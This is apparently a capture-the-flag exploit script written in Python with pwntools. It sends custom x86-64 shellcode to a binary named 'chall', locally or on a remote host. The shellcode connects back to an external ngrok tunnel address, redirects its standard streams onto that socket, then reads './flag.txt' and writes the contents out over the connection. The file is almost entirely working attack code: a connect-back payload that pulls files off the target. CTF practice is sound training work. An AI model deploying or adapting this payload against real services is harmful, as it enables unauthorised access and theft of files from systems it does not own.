#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from time import sleep
from subprocess import check_output

context.log_level = 'debug'
exe = context.binary = ELF('./chall', checksec=False)
libc = exe.libc

gdbscript = '''
init-pwndbg
# init-gef-bata
b *0x040133a
c
'''

def start(argv=[]):
    if args.LOCAL:
        p = exe.process()
        if args.GDB:
            gdb.attach(p, gdbscript=gdbscript)
            pause()
    elif args.DOCKER:
        p = remote('localhost', 9090)
        if args.GDB:
            context.terminal = ['tmux', 'splitw', '-h']
            pid = int(check_output(["pidof", "-s", "./chall"]))
            gdb.attach(pid, gdbscript=gdbscript, exe=exe.path)
            pause()
    elif args.REMOTE:
        host_port = sys.argv[1:]
        p = remote(host_port[0], int(host_port[1]))
    return p


IP, PORT = '0.tcp.ap.ngrok.io', 13521

def sockaddr():
    hostip = socket.getaddrinfo(IP, PORT, socket.AF_INET, socket.SOCK_STREAM)[0][4][0]
    family = struct.pack('<H', socket.AF_INET)
    portbe = struct.pack('>H', PORT)
    ipbytes = socket.inet_aton(hostip)
    packed8 = family + portbe + ipbytes
    num = int.from_bytes(packed8, 'little')
    return hex((-num) & ((1<<64)-1))

# ==================== EXPLOIT ====================
p = start()

sc = asm ('''
socket:
        push 41
        pop rax
        cdq
        push 2
        pop rdi
        push 1
        pop rsi
	syscall
connect:
	xchg eax,edi
	mov al,42
        mov rcx,%s
        neg rcx
        push rcx
        push rsp
        pop rsi
        mov dl,16
        syscall
dup2:
	push 3
        pop rsi
dup2_loop:
        mov al,33
        dec esi
        syscall
        jnz dup2_loop
open_read_write:
        xor     eax, eax
        push    rax
        mov     rbx, 0x0000000000007478
        push    rbx
        mov     rbx, 0x742e67616c662f2e
        push    rbx
        mov     rdi, rsp
        mov     al, 2
        xor     esi, esi
        syscall
        mov     r12, rax

        sub     rsp, 0x1000
read_loop:
        mov     rdi, r12
        mov     rsi, rsp
        mov     edx, 0x1000
        xor     eax, eax
        syscall
        test    rax, rax
        jle     done
        mov     rdx, rax
        mov     rdi, 1
        mov     al, 1
        syscall
        jmp     read_loop

done:
        mov     eax, 60
        xor     edi, edi
        syscall
''' % (sockaddr()))

print(disasm(sc))
s(sc)

interactive(flag=False)
